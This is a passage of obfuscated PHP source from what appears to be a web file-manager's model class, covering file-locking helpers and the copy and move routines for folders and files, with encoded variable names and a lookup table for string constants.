(!$this->allowLock()) { return; } $this->_lockCheck($Œ·÷Úˆ[642], $¡©²®ªĞ); $«­ºñèñ = 1; $this->_lockKey($Œ·÷Úˆ[646] . $¡©²®ªĞ . $Œ·÷Úˆ[10] . $´¶ö¨ù†, $«­ºñèñ); $this->_lockEvent($¡©²®ªĞ, array($Œ·÷Úˆ[641], $Œ·÷Úˆ[643]), $«­ºñèñ); $this->_lockParent($¡©²®ªĞ, array($Œ·÷Úˆ[641], $Œ·÷Úˆ[643]), $«­ºñèñ); $this->_lockCheckEnd($Œ·÷Úˆ[642], $¡©²®ªĞ); } public function lockWriteEnd($÷ÀùŞ, $Š‰¬á¤• = '') { $ÒÒï³³Â =& $_SERVER[¹Éµ„ºå]; if (!$this->allowLock()) { return; } $¢´‰•¥– = 0; $this->_lockKey($ÒÒï³³Â[646] . $÷ÀùŞ . $ÒÒï³³Â[10] . $Š‰¬á¤•, $¢´‰•¥–); $this->_lockEvent($÷ÀùŞ, array($ÒÒï³³Â[641], $ÒÒï³³Â[643]), $¢´‰•¥–); $this->_lockParent($÷ÀùŞ, array($ÒÒï³³Â[641], $ÒÒï³³Â[643]), $¢´‰•¥–); } public function lockMoveStart($’•Ï­íÆ) { $ÉÎç®ÜÁ =& $_SERVER[¹Éµ„ºå]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉÎç®ÜÁ[643], $’•Ï­íÆ); $Òşï‚Ä = 1; $this->_lockKey($ÉÎç®ÜÁ[647] . $’•Ï­íÆ, $Òşï‚Ä); $this->_lockEvent($’•Ï­íÆ, array($ÉÎç®ÜÁ[641], $ÉÎç®ÜÁ[642]), $Òşï‚Ä); $this->_lockParent($’•Ï­íÆ, array($ÉÎç®ÜÁ[641], $ÉÎç®ÜÁ[643]), $Òşï‚Ä); $this->_lockEvent($’•Ï­íÆ, array($ÉÎç®ÜÁ[648], $ÉÎç®ÜÁ[644], $ÉÎç®ÜÁ[645]), $Òşï‚Ä); $this->_lockCheckEnd($ÉÎç®ÜÁ[643], $’•Ï­íÆ); } public function lockMoveEnd($ĞŠ§ğ¶é) { $½Šøë¥¦ =& $_SERVER[¹Éµ„ºå]; if (!$this->allowLock()) { return; } $ïúê˜ûÂ = 0; $this->_lockKey($½Šøë¥¦[647] . $ĞŠ§ğ¶é, $ïúê˜ûÂ); $this->_lockEvent($ĞŠ§ğ¶é, array($½Šøë¥¦[641], $½Šøë¥¦[642]), $ïúê˜ûÂ); $this->_lockParent($ĞŠ§ğ¶é, array($½Šøë¥¦[641], $½Šøë¥¦[643]), $ïúê˜ûÂ); $this->_lockEvent($ĞŠ§ğ¶é, array($½Šøë¥¦[648], $½Šøë¥¦[644], $½Šøë¥¦[645]), $ïúê˜ûÂ); } private function _lockCheck($¼©òø, $ÛÒã¦–) { $ãØ’øË¾ =& $_SERVER[¹Éµ„ºå]; $Çãš–ıÁ = $this->sourceInfo($ÛÒã¦–); $ˆåÆÚÚÉ = $¼©òø . $ãØ’øË¾[10] . $ÛÒã¦–; $this->_lockTimeStart[$ˆåÆÚÚÉ] = timeFloat(); if (!is_array($Çãš–ıÁ)) { return; } $Ôõ°Ş¦› = LNG($ãØ’øË¾[649]); CacheLock::setErrorMsg($ãØ’øË¾[173] . htmlspecialchars($Çãš–ıÁ[$ãØ’øË¾[32]]) . $ãØ’øË¾[175] . $Ôõ°Ş¦›); $this->_lockKey($ˆåÆÚÚÉ, 1); $this->_lockKey($ˆåÆÚÚÉ, 0); $íñˆåÆÊ = array_reverse($this->parentLevelArray($Çãš–ıÁ[$ãØ’øË¾[604]])); foreach ($íñˆåÆÊ as $³åƒÕ×) { $ˆåÆÚÚÉ = $¼©òø . $ãØ’øË¾[650] . $³åƒÕ×; if (CacheLock::lockGet($ãØ’øË¾[651] . $ˆåÆÚÚÉ)) { $Çãš–ıÁ = $this->sourceInfo($³åƒÕ×); CacheLock::setErrorMsg($ãØ’øË¾[173] . htmlspecialchars($Çãš–ıÁ[$ãØ’øË¾[32]]) . $ãØ’øË¾[175] . $Ôõ°Ş¦›); $this->_lockKey($ˆåÆÚÚÉ, 1); $this->_lockKey($ˆåÆÚÚÉ, 0); } } } private function _lockCheckEnd($ªŒÊ¹·, $¢Õ†ÃŞ”) { $º»Íôáö =& $_SERVER[¹Éµ„ºå]; $‘Íí©¢ = $ªŒÊ¹· . $º»Íôáö[10] . $¢Õ†ÃŞ”; CacheLock::setErrorMsg($º»Íôáö[463]); if (!isset($this->_lockTimeStart[$‘Íí©¢])) { return; } $Æ‡áûğÃ = timeFloat() - $this->_lockTimeStart[$‘Íí©¢]; unset($this->_lockTimeStart[$‘Íí©¢]); if ($Æ‡áûğÃ > 0.5) { unset(self::$cacheSourceInfo[$º»Íôáö[547] . $¢Õ†ÃŞ”]); } $€Ô¾™‚é = $this->sourceInfo($¢Õ†ÃŞ”); if (!$€Ô¾™‚é) { show_json(LNG($º»Íôáö[105]), !1); } } private function _lockParent($¶ï¡Â¯€, $ğ¼·Öñ, $Ï­Úğ…ˆ) { if (!$this->autoLockSet) { return; } $ÂúüÍ­È = $this->sourceInfo($¶ï¡Â¯€); if (!is_array($ÂúüÍ­È)) { return; } $—™¿Ö¯’ = array_reverse($this->parentLevelArray($ÂúüÍ­È[$_SERVER[¹Éµ„ºå][604]])); foreach ($—™¿Ö¯’ as $Îù±¤) { $this->_lockEvent($Îù±¤, $ğ¼·Öñ, $Ï­Úğ…ˆ); } } private function _lockEvent($‹ŸÇÛÍ, $Ì˜®åÖì, $¢şèå±ª) { $Ò–óƒ¥Ï =& $_SERVER[¹Éµ„ºå]; if (!$this->autoLockSet) { return; } foreach ($Ì˜®åÖì as $áä€Û± ) { $üœ‘Ğü = $áä€Û±  . $Ò–óƒ¥Ï[10] . $‹ŸÇÛÍ; if ($¢şèå±ª && CacheLock::lockGet($Ò–óƒ¥Ï[651] . $üœ‘Ğü)) { continue; } $this->_lockKey($üœ‘Ğü, $¢şèå±ª); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ò°éíû¥, $£¸‰åó¢ = 1) { $åŞÆ‚Å» = $_SERVER[¹Éµ„ºå][651] . md5($ò°éíû¥); if ($£¸‰åó¢) { if (isset(self::$_lockItemArr[$åŞÆ‚Å»])) { return; } self::$_lockItemArr[$åŞÆ‚Å»] = 1; CacheLock::lock($åŞÆ‚Å», $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$åŞÆ‚Å»])) { return; } unset(self::$_lockItemArr[$åŞÆ‚Å»]); CacheLock::unlock($åŞÆ‚Å»); } } public function isParentOf($è¼ù‡¾’, $«¥ÜÙš) { $è‹×šÈ¿ =& $_SERVER[¹Éµ„ºå]; $ê¥¿¸©’ = $this->sourceInfo($è¼ù‡¾’); $Ù‘ß„×¼ = $this->sourceInfo($«¥ÜÙš); $±³…ÊÀ = $ê¥¿¸©’[$è‹×šÈ¿[604]] . $ê¥¿¸©’[$è‹×šÈ¿[191]] . $è‹×šÈ¿[50]; $æ£¼µñÂ = $Ù‘ß„×¼[$è‹×šÈ¿[604]] . $Ù‘ß„×¼[$è‹×šÈ¿[191]] . $è‹×šÈ¿[50]; $ƒšŒ¢É« = strpos($æ£¼µñÂ, $±³…ÊÀ) === 0; return $ƒšŒ¢É«; } private $targetIsDelete = 0; public function copy($ùŞâ‡Š£, $Œ·éŒá, $Î×çÇä = REPEAT_REPLACE, $òªŒáâ = '') { $ØÂÇƒâÚ =& $_SERVER[¹Éµ„ºå]; $ø½’Ã”Ø = $this->sourceInfo($ùŞâ‡Š£); $ÚéÖ‘ç = $this->sourceInfo($Œ·éŒá); if (!$ø½’Ã”Ø || !$ÚéÖ‘ç || $ÚéÖ‘ç[$ØÂÇƒâÚ[500]] != $ØÂÇƒâÚ[91]) { return !1; } if ($this->isParentOf($ùŞâ‡Š£, $Œ·éŒá)) { return !1; } $ÄŒª° = $òªŒáâ ? $òªŒáâ : $ø½’Ã”Ø[$ØÂÇƒâÚ[32]]; $this->lockCopyStart($ùŞâ‡Š£); $this->lockWriteStart($Œ·éŒá, $ÄŒª°); $”Ì”À‚Ë = array($ØÂÇƒâÚ[652] => array(), $ØÂÇƒâÚ[653] => array(), $ØÂÇƒâÚ[654] => array()); $this->targetIsDelete = intval($ø½’Ã”Ø[$ØÂÇƒâÚ[520]]); $¾ì×°µı = $this->fileNameExistAuto($Œ·éŒá, $ø½’Ã”Ø); $ğã´ Éå = $this->_copy($ùŞâ‡Š£, $Œ·éŒá, $Î×çÇä, $”Ì”À‚Ë, !0, $òªŒáâ); $this->_childrenListClear(); $this->lockCopyEnd($ùŞâ‡Š£); $this->lockWriteEnd($Œ·éŒá, $ÄŒª°); if ($ø½’Ã”Ø[$ØÂÇƒâÚ[500]] == $ØÂÇƒâÚ[91] && $¾ì×°µı == $ğã´ Éå) { $this->folderSizeResetChildren($¾ì×°µı); } Model($ØÂÇƒâÚ[471])->addAll($”Ì”À‚Ë[$ØÂÇƒâÚ[653]], array(), !0); if ($¾ì×°µı != $ğã´ Éå || $ø½’Ã”Ø[$ØÂÇƒâÚ[500]] == $ØÂÇƒâÚ[91]) { Model($ØÂÇƒâÚ[655])->eventCopy($ğã´ Éå); } $this->saveAll($”Ì”À‚Ë[$ØÂÇƒâÚ[654]]); Model($ØÂÇƒâÚ[230])->linkAdd($”Ì”À‚Ë[$ØÂÇƒâÚ[652]]); $this->folderSizeReset($Œ·éŒá); $this->updateModifyTime($Œ·éŒá); return $ğã´ Éå; } private function _copy($¦†Ö–îº, $ƒû¹´ó, $ÖÖíÙÂ, &$ÒõÏ–“, $Â…âÊš¿, $¿ê¨“™ç = '') { $ß·ì„Ìê =& $_SERVER[¹Éµ„ºå]; $–„âˆ¿ö = $this->sourceInfoCache($¦†Ö–îº); $‚¿ö§Ñ = $–„âˆ¿ö[$ß·ì„Ìê[500]] == $ß·ì„Ìê[91]; $°†àÊÂÓ = $¿ê¨“™ç ? $¿ê¨“™ç : $–„âˆ¿ö[$ß·ì„Ìê[32]]; $ş‰‘ù™Ä = $this->fileNameExistAuto($ƒû¹´ó, $–„âˆ¿ö); if ($Â…âÊš¿) { $this->_childrenAllMake($¦†Ö–îº); if ($‚¿ö§Ñ && $ş‰‘ù™Ä) { $this->_childrenAllMake($ş‰‘ù™Ä); } } if (!$ş‰‘ù™Ä) { return $this->_copyCreate($¦†Ö–îº, $ƒû¹´ó, $°†àÊÂÓ, $ÒõÏ–“); } $øÅºˆ…õ = $ş‰‘ù™Ä; if ($‚¿ö§Ñ) { if ($ÖÖíÙÂ == REPEAT_RENAME_FOLDER) { $°†àÊÂÓ = $this->fileNameAutoCache($ƒû¹´ó, $°†àÊÂÓ, $ÖÖíÙÂ, $‚¿ö§Ñ); $øÅºˆ…õ = $this->_copyCreate($¦†Ö–îº, $ƒû¹´ó, $°†àÊÂÓ, $ÒõÏ–“); } else { $Ğ‘ôÍŠß = $this->_childrenList($¦†Ö–îº); foreach ($Ğ‘ôÍŠß as $âäóì) { $this->_copy($âäóì[$ß·ì„Ìê[191]], $ş‰‘ù™Ä, $ÖÖíÙÂ, $ÒõÏ–“, !1); } } } else { if ($ÖÖíÙÂ == REPEAT_RENAME || $ÖÖíÙÂ == REPEAT_RENAME_FOLDER) { $°†àÊÂÓ = $this->fileNameAutoCache($ƒû¹´ó, $°†àÊÂÓ, $ÖÖíÙÂ, $‚¿ö§Ñ); $øÅºˆ…õ = $this->_copyCreate($¦†Ö–îº, $ƒû¹´ó, $°†àÊÂÓ, $ÒõÏ–“); } else { if ($ÖÖíÙÂ == REPEAT_REPLACE) { $ß¾’ä° = $this->sourceInfoCache($ş‰‘ù™Ä); $±ãÑ©¾ = $this->fileHistory($ß¾’ä°, $–„âˆ¿ö[$ß·ì„Ìê[557]], $–„âˆ¿ö[$ß·ì„Ìê[79]]); if ($±ãÑ©¾) { $ÒõÏ–“[$ß·ì„Ìê[652]][] = $–„âˆ¿ö[$ß·ì„Ìê[557]]; } } else { if ($ÖÖíÙÂ == REPEAT_SKIP) { } } } Hook::trigger($ß·ì„Ìê[656], array($ß·ì„Ìê[657], $–„âˆ¿ö, 0)); } return $øÅºˆ…õ; } private function _copyCreate($¼•ì£ƒ, $¬›ƒ—, $æ¶©é˜ş, &$ã†€Ã§ô) { $Åâ§Î­Ó =& $_SERVER[¹Éµ„ºå]; $¨êˆ¶Í­ = $this->sourceInfoCache($¼•ì£ƒ); $İ™Ã––µ = $this->sourceInfoCache($¬›ƒ—); $ûı¯¦¶ = $this->_makeItemData($¨êˆ¶Í­, $İ™Ã––µ, $æ¶©é˜ş); Hook::trigger($Åâ§Î­Ó[658], $ûı¯¦¶); Hook::trigger($Åâ§Î­Ó[659], array($Åâ§Î­Ó[660], $ûı¯¦¶, 0)); $ÉªÂë„® = $this->add($ûı¯¦¶); $ø—©™·ö = array($Åâ§Î­Ó[191] => $ÉªÂë„®, $Åâ§Î­Ó[32] => $æ¶©é˜ş); $this->_copyApplyMeta($ø—©™·ö, $ã†€Ã§ô); if ($¨êˆ¶Í­[$Åâ§Î­Ó[500]] != $Åâ§Î­Ó[91]) { $ã†€Ã§ô[$Åâ§Î­Ó[652]][] = $¨êˆ¶Í­[$Åâ§Î­Ó[557]]; return $ÉªÂë„®; } $ÇÑ“™¥É = array(); $£ş—ßÚ´ = array(); $this->_childrenListAll($¼•ì£ƒ, $ÇÑ“™¥É); $ËŒÑóÏ = count($ÇÑ“™¥É); if ($ËŒÑóÏ == 0) { return $ÉªÂë„®; } $«ıÍª™Î = $this->sourceInfo($ÉªÂë„®); foreach ($ÇÑ“™¥É as $–Æğ½»Ò) { $§İ­œˆ… = $this->_makeItemData($–Æğ½»Ò, $«ıÍª™Î, $–Æğ½»Ò[$Åâ§Î­Ó[32]]); $§İ­œˆ…[$Åâ§Î­Ó[604]] = $–Æğ½»Ò[$Åâ§Î­Ó[604]]; $£ş—ßÚ´[] = $§İ­œˆ…; } $this->chunkEventSet($Åâ§Î­Ó[661], array($Åâ§Î­Ó[662], $ûı¯¦¶, $ËŒÑóÏ)); $this->addAll($£ş—ßÚ´, array(), !1); $š½Ø±Ë = $this->where(array($Åâ§Î­Ó[190] => $ÉªÂë„®))->select(); $§ó¬†û¹ = $this->_childrenMakeRelation($ÇÑ“™¥É, $š½Ø±Ë); $§ó¬†û¹[$¼•ì£ƒ] = $ÉªÂë„®; $Î¾Ğ¡«Ñ = array(); $öÀ¼²¾ô = array(); foreach ($š½Ø±Ë as $–Æğ½»Ò) { $×¿ªÊâÀ = $–Æğ½»Ò[$Åâ§Î­Ó[191]]; $«‚ª¡ = $this->_childrenMatch($§ó¬†û¹, $–Æğ½»Ò, $«ıÍª™Î); $Î¾Ğ¡«Ñ[] = array($Åâ§Î­Ó[191], $×¿ªÊâÀ, $Åâ§Î­Ó[190], $«‚ª¡[$Åâ§Î­Ó[190]]); $öÀ¼²¾ô[] = array($Åâ§Î­Ó[191], $×¿ªÊâÀ, $Åâ§Î­Ó[604], $«‚ª¡[$Åâ§Î­Ó[604]]); $this->_copyApplyMeta($–Æğ½»Ò, $ã†€Ã§ô); if ($–Æğ½»Ò[$Åâ§Î­Ó[500]] != $Åâ§Î­Ó[91]) { $ã†€Ã§ô[$Åâ§Î­Ó[652]][] = $–Æğ½»Ò[$Åâ§Î­Ó[557]]; } } $this->chunkEventSet($Åâ§Î­Ó[663], array($Åâ§Î­Ó[664], $ûı¯¦¶, $ËŒÑóÏ)); $this->saveAll($Î¾Ğ¡«Ñ); $this->chunkEventSet($Åâ§Î­Ó[665], array($Åâ§Î­Ó[666], $ûı¯¦¶, $ËŒÑóÏ)); $this->saveAll($öÀ¼²¾ô); return $ÉªÂë„®; } private function _childrenMakeRelation($Šú—õë, $ØÓ¯ş«) { $†‰Ê¡İ =& $_SERVER[¹Éµ„ºå]; $Öşıš­’ = array(); $ôÇµÖóÎ = array(); foreach ($Šú—õë as $¿¥ÑœüÕ) { $¤Ì¡¼ Æ = $¿¥ÑœüÕ[$†‰Ê¡İ[32]] . $†‰Ê¡İ[8] . $¿¥ÑœüÕ[$†‰Ê¡İ[604]]; $Öşıš­’[$¤Ì¡¼ Æ] = $¿¥ÑœüÕ[$†‰Ê¡İ[191]]; } foreach ($ØÓ¯ş« as $¿¥ÑœüÕ) { $¤Ì¡¼ Æ = $¿¥ÑœüÕ[$†‰Ê¡İ[32]] . $†‰Ê¡İ[8] . $¿¥ÑœüÕ[$†‰Ê¡İ[604]]; $†›ıÖˆ = $Öşıš­’[$¤Ì¡¼ Æ]; $ôÇµÖóÎ[$†›ıÖˆ] = $¿¥ÑœüÕ[$†‰Ê¡İ[191]]; } return $ôÇµÖóÎ; } private function _childrenMatch($ô†¯“˜Å, $ÄõŠ¹Ü®, $“ŞÇĞï) { $ú²ëÛß® =& $_SERVER[¹Éµ„ºå]; $È×µŠ™© = $“ŞÇĞï[$ú²ëÛß®[604]]; $öˆğ¥¢Õ = $this->parentLevelArray($ÄõŠ¹Ü®[$ú²ëÛß®[604]]); foreach ($öˆğ¥¢Õ as $ë»şúßà) { if (isset($ô†¯“˜Å[$ë»şúßà])) { $È×µŠ™© .= $ô†¯“˜Å[$ë»şúßà] . $ú²ëÛß®[667]; } } $È×µŠ™© = rtrim($È×µŠ™©, $ú²ëÛß®[50]) . $ú²ëÛß®[50]; $ºÆ¡øçé = $this->parentLevelArray($È×µŠ™©); $£‘È§¶Û = $ºÆ¡øçé[count($ºÆ¡øçé) - 1]; return array($ú²ëÛß®[190] => $£‘È§¶Û, $ú²ëÛß®[604] => $È×µŠ™©); } private function _makeItemData($£Ôğííú, $²õ¡, $“£šÛÍ) { $ŸøÃ¯¹À =& $_SERVER[¹Éµ„ºå]; $‚âô£•Í = array($ŸøÃ¯¹À[668] => $£Ôğííú[$ŸøÃ¯¹À[500]], $ŸøÃ¯¹À[509] => $“£šÛÍ, $ŸøÃ¯¹À[669] => $£Ôğííú[$ŸøÃ¯¹À[501]] ? $£Ôğííú[$ŸøÃ¯¹À[501]] : $ŸøÃ¯¹À[12], $ŸøÃ¯¹À[558] => $£Ôğííú[$ŸøÃ¯¹À[557]] ? $£Ôğííú[$ŸøÃ¯¹À[557]] : 0, $ŸøÃ¯¹À[640] => $£Ôğííú[$ŸøÃ¯¹À[79]] ? $£Ôğííú[$ŸøÃ¯¹À[79]] : 0, $ŸøÃ¯¹À[670] => intval($²õ¡[$ŸøÃ¯¹À[188]]), $ŸøÃ¯¹À[671] => intval($²õ¡[$ŸøÃ¯¹À[589]]), $ŸøÃ¯¹À[672] => intval(USER_ID), $ŸøÃ¯¹À[673] => intval(USER_ID), $ŸøÃ¯¹À[492] => intval($²õ¡[$ŸøÃ¯¹À[191]]), $ŸøÃ¯¹À[674] => $²õ¡[$ŸøÃ¯¹À[604]] . $²õ¡[$ŸøÃ¯¹À[191]] . $ŸøÃ¯¹À[50], $ŸøÃ¯¹À[513] => $£Ôğííú[$ŸøÃ¯¹À[88]] ? $£Ôğííú[$ŸøÃ¯¹À[88]] : time(), $ŸøÃ¯¹À[519] => 0, $ŸøÃ¯¹À[675] => $ŸøÃ¯¹À[12]); return $‚âô£•Í; } private function _copyApplyMeta($‚ı¦€¿, &$¸µ¶ùàŒ) { $²Ã¸µ‘ =& $_SERVER[¹Éµ„ºå]; $°¢ì•‰ñ = $‚ı¦€¿[$²Ã¸µ‘[191]]; $ùİ˜œäè = $‚ı¦€¿[$²Ã¸µ‘[32]]; if (!isset($‚ı¦€¿[$²Ã¸µ‘[676]]) || !$‚ı¦€¿[$²Ã¸µ‘[676]] || $‚ı¦€¿[$²Ã¸µ‘[676]] == $²Ã¸µ‘[228]) { $¸µ¶ùàŒ[$²Ã¸µ‘[654]][] = array($²Ã¸µ‘[191], $°¢ì•‰ñ, $²Ã¸µ‘[676], short_id($°¢ì•‰ñ)); } if (Input::check($ùİ˜œäè, $²Ã¸µ‘[677])) { $¸µ¶ùàŒ[$²Ã¸µ‘[653]][] = array($²Ã¸µ‘[191] => $°¢ì•‰ñ, $²Ã¸µ‘[95] => $²Ã¸µ‘[552], $²Ã¸µ‘[451] => str_replace($²Ã¸µ‘[53], $²Ã¸µ‘[12], Pinyin::get($ùİ˜œäè))); $¸µ¶ùàŒ[$²Ã¸µ‘[653]][] = array($²Ã¸µ‘[191] => $°¢ì•‰ñ, $²Ã¸µ‘[95] => $²Ã¸µ‘[551], $²Ã¸µ‘[451] => Pinyin::get($ùİ˜œäè, $²Ã¸µ‘[678])); } $¸µ¶ùàŒ[$²Ã¸µ‘[653]][] = array($²Ã¸µ‘[191] => $°¢ì•‰ñ, $²Ã¸µ‘[95] => $²Ã¸µ‘[531], $²Ã¸µ‘[451] => KodSort::makeStr($ùİ˜œäè)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ßìÜ›ï¬) { $ÈæüÀ›¨ =& $_SERVER[¹Éµ„ºå]; $’£ÙÔê’ = $this->sourceInfo($ßìÜ›ï¬); $ÌùË“¤Ğ = $ÈæüÀ›¨[679]; $Ë©Ş§¢œ = array($ÈæüÀ›¨[604] => array($ÈæüÀ›¨[635], $’£ÙÔê’[$ÈæüÀ›¨[604]] . $ßìÜ›ï¬ . $ÈæüÀ›¨[636]), $ÈæüÀ›¨[520] => $this->targetIsDelete); $ş¿Ñ¤¥ô = $this->field($ÌùË“¤Ğ)->where($Ë©Ş§¢œ)->select(); if (!$ş¿Ñ¤¥ô) { return; } $ş¿Ñ¤¥ô = array_to_keyvalue($ş¿Ñ¤¥ô, $ÈæüÀ›¨[191]); foreach ($ş¿Ñ¤¥ô as $²æ´ı—) { $Ò±¯™‹Ê = $²æ´ı—[$ÈæüÀ›¨[190]]; $ßìÜ›ï¬ = $²æ´ı—[$ÈæüÀ›¨[191]]; if (!isset($this->_childrenListCache[$ßìÜ›ï¬]) && $²æ´ı—[$ÈæüÀ›¨[500]] == $ÈæüÀ›¨[91]) { $this->_childrenListCache[$ßìÜ›ï¬] = array(); } if (!isset($this->_childrenListCache[$Ò±¯™‹Ê])) { $this->_childrenListCache[$Ò±¯™‹Ê] = array(); } $this->_childrenListCache[$Ò±¯™‹Ê][$ßìÜ›ï¬] = $²æ´ı—; $this->_childrenItemCache[$ßìÜ›ï¬] = $²æ´ı—; } } private function _childrenListAll($ÕöÆ³…è, &$Éˆ¶”ç¡) { $®è¶¦Ñ =& $_SERVER[¹Éµ„ºå]; if (!isset($this->_childrenListCache[$ÕöÆ³…è])) { return; } $óô†± = $this->_childrenListCache[$ÕöÆ³…è]; foreach ($óô†± as $èùâŞÎÎ => $ÙÄ•™º–) { $Éˆ¶”ç¡[$èùâŞÎÎ] = $ÙÄ•™º–; if ($ÙÄ•™º–[$®è¶¦Ñ[500]] == $®è¶¦Ñ[91]) { $this->_childrenListAll($èùâŞÎÎ, $Éˆ¶”ç¡); } } } private function sourceInfoCache($²ƒ£°È) { if (isset($this->_childrenItemCache[$²ƒ£°È])) { return $this->_childrenItemCache[$²ƒ£°È]; } return $this->sourceInfo($²ƒ£°È); } private function _childrenList($ñŸÌù—¿) { if (isset($this->_childrenListCache[$ñŸÌù—¿])) { return $this->_childrenListCache[$ñŸÌù—¿]; } return $this->_childrenListSelect($ñŸÌù—¿); } private function _childrenListSelect($á˜û–Á³) { $¶Ü‹ˆ™Ô =& $_SERVER[¹Éµ„ºå]; $¼À¥§Àú = array($¶Ü‹ˆ™Ô[190] => $á˜û–Á³, $¶Ü‹ˆ™Ô[520] => $this->targetIsDelete); $±…Ø„Şî = $this->where($¼À¥§Àú)->select(); $±…Ø„Şî = $±…Ø„Şî ? $±…Ø„Şî : array(); $µß¸ÇÒå = array_to_keyvalue($±…Ø„Şî, $¶Ü‹ˆ™Ô[191]); $this->_childrenListCache[$á˜û–Á³] = $µß¸ÇÒå; foreach ($µß¸ÇÒå as $á˜û–Á³ => $êßê¶”Û) { $this->_childrenItemCache[$á˜û–Á³] = $êßê¶”Û; } return $µß¸ÇÒå; } private function fileNameExistAuto($½»ÛÔïş, $ÛÖ¸œ¶î) { $ó¯†­‹‘ =& $_SERVER[¹Éµ„ºå]; if ($ÛÖ¸œ¶î[$ó¯†­‹‘[520]] == $ó¯†­‹‘[91]) { return $this->fileNameExist($½»ÛÔïş, $ÛÖ¸œ¶î[$ó¯†­‹‘[32]]); } return $this->fileNameExistCache($½»ÛÔïş, $ÛÖ¸œ¶î[$ó¯†­‹‘[32]]); } private function fileNameExistCache($¦ˆ€ùÜØ, $È±ÅÃ€Û) { $¬ğ•õı¬ =& $_SERVER[¹Éµ„ºå]; $È±ÅÃ€Û = strtolower($È±ÅÃ€Û); $–°½£ÆĞ = $this->_childrenList($¦ˆ€ùÜØ); foreach ($–°½£ÆĞ as $­ÅÏÔƒê) { if ($È±ÅÃ€Û == strtolower($­ÅÏÔƒê[$¬ğ•õı¬[32]])) { return $­ÅÏÔƒê[$¬ğ•õı¬[191]]; } } return !1; } private function fileNameAutoCache($©³é°É, $£‰’ñß¥, $‚™·­“â, $ËÔç»Ş) { $¨£Ïİıá =& $_SERVER[¹Éµ„ºå]; $¥¹¸´Ì‚ = $this->_childrenList($©³é°É); $ÁÀ®«Ğµ = array_to_keyvalue($¥¹¸´Ì‚, $¨£Ïİıá[12], $¨£Ïİıá[32]); return $this->fileNameAutoGet($ÁÀ®«Ğµ, $£‰’ñß¥, $‚™·­“â, $ËÔç»Ş); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($É§¼¢á¶, $Ù†Ôâ†Ù, $ßÀÜ‘ = REPEAT_REPLACE, $ÌÏÉ‹¨í = '') { $»ØŸÙ¡ö =& $_SERVER[¹Éµ„ºå]; $Å†ã£¹™ = $this->sourceInfo($É§¼¢á¶); $Ğ––¨ò = $this->sourceInfo($Ù†Ôâ†Ù); if ($Å†ã£¹™[$»ØŸÙ¡ö[190]] == $Ğ––¨ò[$»ØŸÙ¡ö[191]]) { if ($Å†ã£¹™[$»ØŸÙ¡ö[520]] == $»ØŸÙ¡ö[91]) { Model($»ØŸÙ¡ö[518])->restore(array($É§¼¢á¶)); } if (!$ÌÏÉ‹¨í || $ÌÏÉ‹¨í == $Å†ã£¹™[$»ØŸÙ¡ö[32]]) { return $É§¼¢á¶; } } $¨‹ê²’¬ = $this->pathInfoMore($É§¼¢á¶); if ($this->isParentOf($É§¼¢á¶, $Ù†Ôâ†Ù)) { return !1; } if (!$Å†ã£¹™ || !$Ğ––¨ò || $Ğ––¨ò[$»ØŸÙ¡ö[500]] != $»ØŸÙ¡ö[91]) { return !1; } Hook::trigger($»ØŸÙ¡ö[680], $¨‹ê²’¬); $this->targetIsDelete = intval($Å†ã£¹™[$»ØŸÙ¡ö[520]]); if ($Å†ã£¹™[$»ØŸÙ¡ö[190]] == $Ù†Ôâ†Ù && $ÌÏÉ‹¨í != $Å†ã£¹™[$»ØŸÙ¡ö[32]]) { $ºÏ«Áæ‰ = $this->fileNameExist($Ù†Ôâ†Ù, $ÌÏÉ‹¨í); if ($ºÏ«Áæ‰ && $Å†ã£¹™[$»ØŸÙ¡ö[500]] == $»ØŸÙ¡ö[228]) { $ë€¤ÏàŸ = $this->sourceInfo($ºÏ«Áæ‰); $¥èÀ‰ï³ = $this->fileHistory($ë€¤ÏàŸ, $Å†ã£¹™[$»ØŸÙ¡ö[557]], $Å†ã£¹™[$»ØŸÙ¡ö[79]]); if (!$¥èÀ‰ï³) { Model($»ØŸÙ¡ö[560])->remove($Å†ã£¹™[$»ØŸÙ¡ö[557]]); } $this->removeNow($É§¼¢á¶, !1); $this->folderSizeReset($Ù†Ôâ†Ù); Hook::trigger($»ØŸÙ¡ö[681], $¨‹ê²’¬); return $ºÏ«Áæ‰; } } $•ˆê‹ëÏ = $ÌÏÉ‹¨í ? $ÌÏÉ‹¨í : $Å†ã£¹™[$»ØŸÙ¡ö[32]]; $this->lockMoveStart($É§¼¢á¶); $this->lockWriteStart($Ù†Ôâ†Ù, $•ˆê‹ëÏ); $€Ö½§Ïü = array($»ØŸÙ¡ö[652] => array(), $»ØŸÙ¡ö[682] => !1); $this->clearShare($É§¼¢á¶, $Ù†Ôâ†Ù); $ªÍ‚ÖÃÔ = $this->fileNameExistAuto($Ù†Ôâ†Ù, $Å†ã£¹™); $°ªˆÑ­À = $this->_move($É§¼¢á¶, $Ù†Ôâ†Ù, $ßÀÜ‘, $€Ö½§Ïü, $ÌÏÉ‹¨í); $this->sourceCacheClear(); if ($Å†ã£¹™[$»ØŸÙ¡ö[500]] == $»ØŸÙ¡ö[91] && $ªÍ‚ÖÃÔ) { $this->folderSizeResetChildren($°ªˆÑ­À); } Model($»ØŸÙ¡ö[230])->linkAdd($€Ö½§Ïü[$»ØŸÙ¡ö[652]]); if ($°ªˆÑ­À && $ªÍ‚ÖÃÔ && $€Ö½§Ïü[$»ØŸÙ¡ö[682]]) { $…ÖÏÌª¶ = $Å†ã£¹™[$»ØŸÙ¡ö[500]] == $»ØŸÙ¡ö[91] ? $this->_childrenListSelect($É§¼¢á¶) : !1; $Øü¿—›® = $…ÖÏÌª¶ && count($…ÖÏÌª¶) > 0 ? !0 : !1; $this->removeNow($É§¼¢á¶, $Øü¿—›®); } $this->lockMoveEnd($É§¼¢á¶); $this->lockWriteEnd($Ù†Ôâ†Ù, $•ˆê‹ëÏ); $this->folderSizeReset($Å†ã£¹™[$»ØŸÙ¡ö[190]]); $this->folderSizeReset($Ù†Ôâ†Ù); $«”¥Ôã– = array($Å†ã£¹™[$»ØŸÙ¡ö[190]], $Ù†Ôâ†Ù); if ($Å†ã£¹™[$»ØŸÙ¡ö[500]] == $»ØŸÙ¡ö[91]) { $«”¥Ôã–[] = $É§¼¢á¶; } 